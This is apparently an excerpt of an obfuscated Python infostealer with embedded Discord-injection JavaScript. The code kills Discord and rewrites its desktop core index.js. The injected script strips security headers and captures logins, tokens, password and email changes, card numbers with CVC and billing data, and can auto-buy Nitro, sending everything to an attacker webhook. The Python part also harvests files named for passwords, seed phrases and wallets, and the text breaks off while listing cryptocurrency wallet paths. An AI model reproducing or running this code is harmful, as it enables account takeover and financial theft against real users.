  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Email Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: New Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Paypal Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Card Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':identification_card: Card:',
            value: `\`\`\`Number: ${number}\nCVC: ${cvc}\nExpir Month: ${expir_month}\nExpir Year: ${expir_year}\`\`\``,
            inline: false,
          },
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Nitro Bought] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':rocket: Nitro Code:',
            value: `\`\`\`${code}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');"""

def GGZQVAYTKSYOXHKTXWLAYCYTUJQVVDZTNTCGUPNQYBXAFGQAWAFOFYJZQZVFATNJESJWOGACFHHDWWERIQGKCAGGCSPLH():
    import os
    import re
    import subprocess
    import psutil

    ILSUGHEIZWMHZCFVRCKYVZXXXECUMDHEKOPQKVJRVKAKYODIRSCPXHLUDECYPKGXFHUXDQCWVWBPIOOHNTZEKMVTSFMFZD = "Active"

    def VEIBXMKZUTCBLLHQGWNBJOTGWUNYLXDGOUHVNPLWYMIVWGSFZLRZDBUNTZOYPSTS(XCJVNVTPZUGQBVCOSTQJVKFOZINCIZZNQARFNYFBDWHWTXIEYCNLICGXXXMPORBXJZYLDDDQOLHE):
        for v4r_file in os.listdir(XCJVNVTPZUGQBVCOSTQJVKFOZINCIZZNQARFNYFBDWHWTXIEYCNLICGXXXMPORBXJZYLDDDQOLHE):
            if re.search(r'app-+?', v4r_file):
                XVKZWRRMHABDGXYZQVXXWXWUYISHLLGYAIDIRCAPKTYXBBEITRUMDJGJBRXGZ = XCJVNVTPZUGQBVCOSTQJVKFOZINCIZZNQARFNYFBDWHWTXIEYCNLICGXXXMPORBXJZYLDDDQOLHE + '\\' + v4r_file + '\\modules'
                if not os.path.exists(XVKZWRRMHABDGXYZQVXXWXWUYISHLLGYAIDIRCAPKTYXBBEITRUMDJGJBRXGZ):
                    continue
                for v4r_file in os.listdir(XVKZWRRMHABDGXYZQVXXWXWUYISHLLGYAIDIRCAPKTYXBBEITRUMDJGJBRXGZ):
                    if re.search(r'discord_desktop_core-+?', v4r_file):
                        AUFQIKLPEZPNWFBPUVRJJLRLFUWVKSRMIBDHWWDKHQDTPUUKMRCLJVRCGFA = XVKZWRRMHABDGXYZQVXXWXWUYISHLLGYAIDIRCAPKTYXBBEITRUMDJGJBRXGZ + '\\' + v4r_file + '\\' + 'discord_desktop_core'
                        return AUFQIKLPEZPNWFBPUVRJJLRLFUWVKSRMIBDHWWDKHQDTPUUKMRCLJVRCGFA, v4r_file
        return None

    def DZAFNTBJRDFZNPIQNRICOIJWJMSGUGMWAYMBDXLUAARUKYWLNQDUXGXMDQPIXOTQZU(XCJVNVTPZUGQBVCOSTQJVKFOZINCIZZNQARFNYFBDWHWTXIEYCNLICGXXXMPORBXJZYLDDDQOLHE):
        VANYBHICFNIQROXGZYBTBEAKNENMRXEBHNTMJDKQUKZHRJNHFNJJJFX = XCJVNVTPZUGQBVCOSTQJVKFOZINCIZZNQARFNYFBDWHWTXIEYCNLICGXXXMPORBXJZYLDDDQOLHE + '\\Update.exe'
        WAZSNVYULHRJJUBYLQDVLOBOWMHCPBDLMQJWTJCHGASCDHADQUVTHUYMIIOZYTGIFWSWGIUYWNJYAMEQSZZBC = XCJVNVTPZUGQBVCOSTQJVKFOZINCIZZNQARFNYFBDWHWTXIEYCNLICGXXXMPORBXJZYLDDDQOLHE.split('\\')[-1] + '.exe'

        for v4r_file in os.listdir(XCJVNVTPZUGQBVCOSTQJVKFOZINCIZZNQARFNYFBDWHWTXIEYCNLICGXXXMPORBXJZYLDDDQOLHE):
            if re.search(r'app-+?', v4r_file):
                LNDYYHXLAKOMHCTAKVZDRQDVFKWGYRZGZWQSNJAJAIUMSKTHDRWPDCQXCDDT = XCJVNVTPZUGQBVCOSTQJVKFOZINCIZZNQARFNYFBDWHWTXIEYCNLICGXXXMPORBXJZYLDDDQOLHE + '\\' + v4r_file
                if os.path.exists(LNDYYHXLAKOMHCTAKVZDRQDVFKWGYRZGZWQSNJAJAIUMSKTHDRWPDCQXCDDT + '\\' + 'modules'):
                    for v4r_file in os.listdir(LNDYYHXLAKOMHCTAKVZDRQDVFKWGYRZGZWQSNJAJAIUMSKTHDRWPDCQXCDDT):
                        if v4r_file == WAZSNVYULHRJJUBYLQDVLOBOWMHCPBDLMQJWTJCHGASCDHADQUVTHUYMIIOZYTGIFWSWGIUYWNJYAMEQSZZBC:
                            WAZSNVYULHRJJUBYLQDVLOBOWMHCPBDLMQJWTJCHGASCDHADQUVTHUYMIIOZYTGIFWSWGIUYWNJYAMEQSZZBC = LNDYYHXLAKOMHCTAKVZDRQDVFKWGYRZGZWQSNJAJAIUMSKTHDRWPDCQXCDDT + '\\' + WAZSNVYULHRJJUBYLQDVLOBOWMHCPBDLMQJWTJCHGASCDHADQUVTHUYMIIOZYTGIFWSWGIUYWNJYAMEQSZZBC
                            subprocess.call([VANYBHICFNIQROXGZYBTBEAKNENMRXEBHNTMJDKQUKZHRJNHFNJJJFX, '--processStart', WAZSNVYULHRJJUBYLQDVLOBOWMHCPBDLMQJWTJCHGASCDHADQUVTHUYMIIOZYTGIFWSWGIUYWNJYAMEQSZZBC],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def KUJSIDOQJNAECPCXJFEYSJGXIBZQBAVFTECPQNTYFUCUBYGCROGHAHORVOCA():
        LNDYYHXLAKOMHCTAKVZDRQDVFKWGYRZGZWQSNJAJAIUMSKTHDRWPDCQXCDDTdata = os.getenv('LOCALAPPDATA')
        TBNFKNGHWVFMVEOPWZKOGDMSWFTZTJVMDRTGHEELZENBEKJJYHNEPBYYDEYGEQGCJUMOLEZWO = [
            LNDYYHXLAKOMHCTAKVZDRQDVFKWGYRZGZWQSNJAJAIUMSKTHDRWPDCQXCDDTdata + '\\Discord',
            LNDYYHXLAKOMHCTAKVZDRQDVFKWGYRZGZWQSNJAJAIUMSKTHDRWPDCQXCDDTdata + '\\DiscordCanary',
            LNDYYHXLAKOMHCTAKVZDRQDVFKWGYRZGZWQSNJAJAIUMSKTHDRWPDCQXCDDTdata + '\\DiscordPTB',
            LNDYYHXLAKOMHCTAKVZDRQDVFKWGYRZGZWQSNJAJAIUMSKTHDRWPDCQXCDDTdata + '\\DiscordDevelopment'
        ]
        XUMQKTCKVXOMWLCUMUETRPOEWXMEPMGDPNISALMWEPSLYEZDZQOYAHFVLGGOQUUDZHWVFBANJMYFB = TYJKFJJOFEUCHPUBEKNNXGIUWEGTIOCXVTALOURTAHUOWSFGHWHDYXY

        for v4r_proc in psutil.process_iter():
            if 'discord' in v4r_proc.name().lower():
                v4r_proc.kill()

        for XCJVNVTPZUGQBVCOSTQJVKFOZINCIZZNQARFNYFBDWHWTXIEYCNLICGXXXMPORBXJZYLDDDQOLHE in TBNFKNGHWVFMVEOPWZKOGDMSWFTZTJVMDRTGHEELZENBEKJJYHNEPBYYDEYGEQGCJUMOLEZWO:
            if not os.path.exists(XCJVNVTPZUGQBVCOSTQJVKFOZINCIZZNQARFNYFBDWHWTXIEYCNLICGXXXMPORBXJZYLDDDQOLHE):
                continue

            AUFQIKLPEZPNWFBPUVRJJLRLFUWVKSRMIBDHWWDKHQDTPUUKMRCLJVRCGFA_info = VEIBXMKZUTCBLLHQGWNBJOTGWUNYLXDGOUHVNPLWYMIVWGSFZLRZDBUNTZOYPSTS(XCJVNVTPZUGQBVCOSTQJVKFOZINCIZZNQARFNYFBDWHWTXIEYCNLICGXXXMPORBXJZYLDDDQOLHE)
            if AUFQIKLPEZPNWFBPUVRJJLRLFUWVKSRMIBDHWWDKHQDTPUUKMRCLJVRCGFA_info is not None:
                AUFQIKLPEZPNWFBPUVRJJLRLFUWVKSRMIBDHWWDKHQDTPUUKMRCLJVRCGFA, AUFQIKLPEZPNWFBPUVRJJLRLFUWVKSRMIBDHWWDKHQDTPUUKMRCLJVRCGFA_file = AUFQIKLPEZPNWFBPUVRJJLRLFUWVKSRMIBDHWWDKHQDTPUUKMRCLJVRCGFA_info
                
                ISMPBGRRYOIBHITUTGCOMOYCEJMBTZKJBYNLCUPVNGSPMANZAVSPTMFOMZYNDRHSFGRXGPWTSJATFDVIMQKCJGF = AUFQIKLPEZPNWFBPUVRJJLRLFUWVKSRMIBDHWWDKHQDTPUUKMRCLJVRCGFA + '\\index.js'
                
                if not os.path.exists(ISMPBGRRYOIBHITUTGCOMOYCEJMBTZKJBYNLCUPVNGSPMANZAVSPTMFOMZYNDRHSFGRXGPWTSJATFDVIMQKCJGF):
                    open(ISMPBGRRYOIBHITUTGCOMOYCEJMBTZKJBYNLCUPVNGSPMANZAVSPTMFOMZYNDRHSFGRXGPWTSJATFDVIMQKCJGF, 'w').close()

                with open(ISMPBGRRYOIBHITUTGCOMOYCEJMBTZKJBYNLCUPVNGSPMANZAVSPTMFOMZYNDRHSFGRXGPWTSJATFDVIMQKCJGF, 'w', encoding='utf-8') as f:
                    f.write((XUMQKTCKVXOMWLCUMUETRPOEWXMEPMGDPNISALMWEPSLYEZDZQOYAHFVLGGOQUUDZHWVFBANJMYFB).replace('discord_desktop_core-1', AUFQIKLPEZPNWFBPUVRJJLRLFUWVKSRMIBDHWWDKHQDTPUUKMRCLJVRCGFA_file)
                            .replace(r"%WEBHOOK_HERE%", UGPNNDXWBLWFMCAHXQDDHQVIYLHHVKBFICGKAJHSLWOVUXGAXIA)
                            .replace(r"%EMBED_COLOR%", str(AYJBAAQFXHWGWWUODTJYHAUQYIZKKYHDEXFMBYYYJBRPRMKLMAONP))
                            .replace(r"%USERNAME%", CAYZQTAYKWJCOCEVLLWWIHEGJRZOBUOYTUFFFPOKOEXZTQFVBSRWIFZCHGUNMSAMIELMFKHI)
                            .replace(r"%IP_PUBLIC%", HOYOUCWQGHITKOIBXOPAFBIZOTICFURVECQEFJMENZDKEZRBVLCOCKGKUPOVFLDXKCXRVNRUOZSDZGNLEQNSRZZRDTFDIFTHL)
                            .replace(r"%EMBED_NAME%", GKWMWGMNRTMNLHJXJKECQAQODFSIWYQMPHJXRBVIJYZDRIFHOUTZJPHDNCMFCEEZRODGZOUBVLUWKVIRGU)
                            .replace(r"%EMBED_ICON%", CREPNGVJWOMVBJIPFFVLZRBVMJKJTIQDHQMJNUZXYGKRICETYVFNGEJZBIQNZITRLWCNFSCEESJREABYKYPDDICGOW)
                            .replace(r"%FOOTER_TEXT%", EVWPJGIPRPTJMCAPHCKLAFCLTEEYWGEKNYFAJJLGPTJHJGCLYSPKCQC)
                            .replace(r"%WEBSITE%", JEMPFEBBYGEOAMOECNRNOBUVGDWSHPFQGOODCKGQKQLUTBTTQSYDFQEGQTONBJZEYPUUAZCCCJEOQW))
                DZAFNTBJRDFZNPIQNRICOIJWJMSGUGMWAYMBDXLUAARUKYWLNQDUXGXMDQPIXOTQZU(XCJVNVTPZUGQBVCOSTQJVKFOZINCIZZNQARFNYFBDWHWTXIEYCNLICGXXXMPORBXJZYLDDDQOLHE)
                
    KUJSIDOQJNAECPCXJFEYSJGXIBZQBAVFTECPQNTYFUCUBYGCROGHAHORVOCA()
    return ILSUGHEIZWMHZCFVRCKYVZXXXECUMDHEKOPQKVJRVKAKYODIRSCPXHLUDECYPKGXFHUXDQCWVWBPIOOHNTZEKMVTSFMFZD

def YHKOOPOQFRQRLVTLJALHCWVWBGUUCBPPWOLLNOFMWNYHSYFCRIQKEZYAUZUQMWUWLHBIUS(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI):
    import os
    import random

    SDDVXOCEFSWMPSRHHPKPPFKRIHNYXJCELDXMDCKGUZYYLQVLSFBMMCPLQVSIZPCZRBGYGYPUZSJPIJJQ = [
        os.path.join(BLQCBPFSBNWTWXVRWCLYQUEKHYSEOHCKOPETHQWSGNMPDWGVBHXVQAZXEDQIFUXSEWDWPSGKCOLMYQWFXADLJXGNQRVBFNNRDB, "Desktop"),
        os.path.join(BLQCBPFSBNWTWXVRWCLYQUEKHYSEOHCKOPETHQWSGNMPDWGVBHXVQAZXEDQIFUXSEWDWPSGKCOLMYQWFXADLJXGNQRVBFNNRDB, "Downloads"),
        os.path.join(BLQCBPFSBNWTWXVRWCLYQUEKHYSEOHCKOPETHQWSGNMPDWGVBHXVQAZXEDQIFUXSEWDWPSGKCOLMYQWFXADLJXGNQRVBFNNRDB, "Documents"),
        os.path.join(BLQCBPFSBNWTWXVRWCLYQUEKHYSEOHCKOPETHQWSGNMPDWGVBHXVQAZXEDQIFUXSEWDWPSGKCOLMYQWFXADLJXGNQRVBFNNRDB, "Picture"),
        os.path.join(BLQCBPFSBNWTWXVRWCLYQUEKHYSEOHCKOPETHQWSGNMPDWGVBHXVQAZXEDQIFUXSEWDWPSGKCOLMYQWFXADLJXGNQRVBFNNRDB, "Video"),
        os.path.join(BLQCBPFSBNWTWXVRWCLYQUEKHYSEOHCKOPETHQWSGNMPDWGVBHXVQAZXEDQIFUXSEWDWPSGKCOLMYQWFXADLJXGNQRVBFNNRDB, "OneDrive"),
        os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB, "Microsoft", "Windows", "Recent")
    ]

    SBARHFCWEJUQUQIEWBHFYSNCZLXEEZUQUMZGFQNVSYPLPVIIWRDPRLZWDZHQSwords = [
        "2fa", "mfa", "2step", "otp", "verification", "verif",
        "acount", "account", "compte", "identifiant", "login",
        "personnel", "personal", "perso",
        "banque", "bank", "funds", "fonds", "paypal", "casino",
        "crypto", "cryptomonnaie", "bitcoin", "btc", "eth", "ethereum", "atomic", "exodus", "binance", "metamask", "trading", "échange", "exchange", "wallet", "portefeuille", "ledger", "trezor", "seed", "seed phrase", "phrase de récupération", "recovery", "récupération", "recovery phrase", "phrase de récupération", "mnemonic", "mnémonique","passphrase", "phrase secrète", "wallet key", "clé de portefeuille", "mywallet", "backupwallet", "wallet backup", "sauvegarde de portefeuille", "private key", "clé privée", "keystore", "trousseau", "json", "trustwallet", "safepal", "coinbase", "kucoin", "kraken", "blockchain", "bnb", "usdt",
        "telegram", "disc", "discord", "token", "tkn", "webhook", "api", "bot", "tokendisc",
        "key", "clé", "cle", "keys", "private", "prive", "privé", "secret", "steal", "voler", "access", "auth",
        "mdp", "motdepasse", "mot_de_passe", "password", "psw", "pass", "passphrase", "phrase", "pwd", "passwords",
        "data", "donnée", "donnee", "donnees", "details",
        "confidential", "confidentiel", "sensitive", "sensible", "important", "privilege", "privilège"
        "vault", "safe", "locker", "protection", "hidden", "caché", "cache",
        "identity", "identité", "passport", "passeport", "permis",
        "pin", "nip",
        "leak", "dump", "exposed", "hack", "crack", "pirate", "piratage", "breach", "faille",
        "master", "admin", "administrator", "administrateur", "root", "owner", "propriétaire", "proprietaire",
        "keyfile", "keystore", "seedphrase", "recoveryphrase", "privatekey", "publickey",
        "accountdata", "userdata", "logininfo", "seedbackup",
    ]

    GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ_files = []

    for YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO in SDDVXOCEFSWMPSRHHPKPPFKRIHNYXJCELDXMDCKGUZYYLQVLSFBMMCPLQVSIZPCZRBGYGYPUZSJPIJJQ:
        for v4r_root, XCJVNVTPZUGQBVCOSTQJVKFOZINCIZZNQARFNYFBDWHWTXIEYCNLICGXXXMPORBXJZYLDDDQOLHEs, v4r_files in os.walk(YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO):
            for v4r_file in v4r_files:
                try:
                    if v4r_file.lower().endswith(('.txt', '.sql', '.zip')):
                        BKJQPCTFYVKHQSRKMJAFTENPWFDQCKEZDWNESLCWBJYRJEHPDIREQ = os.path.splitext(v4r_file)[0].lower()
                        for SBARHFCWEJUQUQIEWBHFYSNCZLXEEZUQUMZGFQNVSYPLPVIIWRDPRLZWDZHQSword in SBARHFCWEJUQUQIEWBHFYSNCZLXEEZUQUMZGFQNVSYPLPVIIWRDPRLZWDZHQSwords:
                            try:
                                if SBARHFCWEJUQUQIEWBHFYSNCZLXEEZUQUMZGFQNVSYPLPVIIWRDPRLZWDZHQSword.lower() == BKJQPCTFYVKHQSRKMJAFTENPWFDQCKEZDWNESLCWBJYRJEHPDIREQ:
                                    GJLMNFVWWWOEGCZSTHYTOMRYNSXPJTBNCIUKTDQXXHXWCYXVIJTMRGZ = os.path.join(v4r_root, v4r_file)
                                    if os.path.exists(GJLMNFVWWWOEGCZSTHYTOMRYNSXPJTBNCIUKTDQXXHXWCYXVIJTMRGZ):
                                        GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ_files.append(v4r_file)
                                        v4r_base_name, v4r_ext = os.path.splitext(v4r_file)
                                        with open(GJLMNFVWWWOEGCZSTHYTOMRYNSXPJTBNCIUKTDQXXHXWCYXVIJTMRGZ, "rb") as v4r_f:
                                            BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI.writestr(os.path.join("Interesting Files", v4r_base_name + f"_{random.randint(1, 9999)}" + v4r_ext), v4r_f.read())
                                    break
                            except: pass
                except: pass

    if GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ_files:
        NZVSXRFZAKAETTRSWINNBYKWUNQBWEAEUHINGYYRVUEUGMOLZRQACWOVZQTCFSZYMLFVYMTPJFCIHVIPQWWKKXN = sum(len(phrase.split()) for phrase in GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ_files)
    else:
        NZVSXRFZAKAETTRSWINNBYKWUNQBWEAEUHINGYYRVUEUGMOLZRQACWOVZQTCFSZYMLFVYMTPJFCIHVIPQWWKKXN = 0

    return NZVSXRFZAKAETTRSWINNBYKWUNQBWEAEUHINGYYRVUEUGMOLZRQACWOVZQTCFSZYMLFVYMTPJFCIHVIPQWWKKXN

def TQUJVOZDRADKLDSOLXKDXOEDCGDWHFQKVDRGBUMKPIHMTHUFKHUMRPLGPEWGZJDGBBALZ(BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI):
    import os
    import psutil

    DDDFKJFBOJCZNBTZMCYYENMZWXSJDNTYHYLIJXSBTWZZQUPZQLHPVFLHCPHWDTSPGZEZ = ["Wallets", "Game Launchers", "Apps"]
    CLRSIVUAITTGJWOEOTDGLJEOYRNLDZQOTAHHHOTZZLJUFLVLYTLUVMUIPLAULSNOXHODZMGQFXI         = [] if "Wallets" in DDDFKJFBOJCZNBTZMCYYENMZWXSJDNTYHYLIJXSBTWZZQUPZQLHPVFLHCPHWDTSPGZEZ else None
    IMGQSSVGAFTXEWGBSICZAGCFVSLJYPWIKVYPAWZQAHXIWUYKFFOPQVKZAS  = [] if "Game Launchers" in DDDFKJFBOJCZNBTZMCYYENMZWXSJDNTYHYLIJXSBTWZZQUPZQLHPVFLHCPHWDTSPGZEZ else None
    TXGJFROSUQYVJLTATLIKADIZZGDBDYRRXDVECLZVSWWIXYEFIZUMIEIFSVZYQREEZTFYETBYLLUJOWGGGRCMQNQODVVRMIBAIG            = [] if "Apps" in DDDFKJFBOJCZNBTZMCYYENMZWXSJDNTYHYLIJXSBTWZZQUPZQLHPVFLHCPHWDTSPGZEZ else None

    WMKAPFXMIYWPTUURMLBCONDZNCRZJOMGAPLNAILSJJWHJPYGRKOZHIOFDGPZHULRIOQKOSNG = [
        ("Zcash",             os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "Zcash"),                                                      "zcash.exe",             "Wallets"),
        ("Armory",            os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "Armory"),                                                     "armory.exe",            "Wallets"),
        ("Bytecoin",          os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "bytecoin"),                                                   "bytecoin.exe",          "Wallets"),
        ("Guarda",            os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "Guarda", "Local Storage", "leveldb"),                         "guarda.exe",            "Wallets"),
        ("Atomic Wallet",     os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "atomic", "Local Storage", "leveldb"),                         "atomic.exe",            "Wallets"),
        ("Exodus",            os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "Exodus", "exodus.wallet"),                                    "exodus.exe",            "Wallets"),
        ("Binance",           os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "Binance", "Local Storage", "leveldb"),                        "binance.exe",           "Wallets"),
        ("Jaxx Liberty",      os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"), "jaxx.exe",              "Wallets"),
        ("Electrum",          os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "Electrum", "wallets"),                                        "electrum.exe",          "Wallets"),
        ("Coinomi",           os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "Coinomi", "Coinomi", "wallets"),                              "coinomi.exe",           "Wallets"),
        ("Trust Wallet",      os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "Trust Wallet"),                                               "trustwallet.exe",       "Wallets"),
        ("AtomicDEX",         os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "AtomicDEX"),                                                  "atomicdex.exe",         "Wallets"),
        ("Wasabi Wallet",     os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "WalletWasabi", "Wallets"),                                    "wasabi.exe",            "Wallets"),
        ("Ledger Live",       os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "Ledger Live"),                                                "ledgerlive.exe",        "Wallets"),
        ("Trezor Suite",      os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "Trezor", "suite"),                                            "trezor.exe",            "Wallets"),
        ("Blockchain Wallet", os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "Blockchain", "Wallet"),                                       "blockchain.exe",        "Wallets"),
        ("Mycelium",          os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "Mycelium", "Wallets"),                                        "mycelium.exe",          "Wallets"),
        ("Crypto.com",        os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "Crypto.com", "appdata"),                                      "crypto.com.exe",        "Wallets"),
        ("BRD",               os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "BRD", "wallets"),                                             "brd.exe",               "Wallets"),
        ("Coinbase Wallet",   os.path.join(SCQQKLTVFTSXIGLCOXLUSMMREHGQIEJBMQSJXRCRNNGXNNYLLXBBFOSEWFB,   "Coinbase", "Wallet"),                                         "coinbase.exe",          "Wallets"),
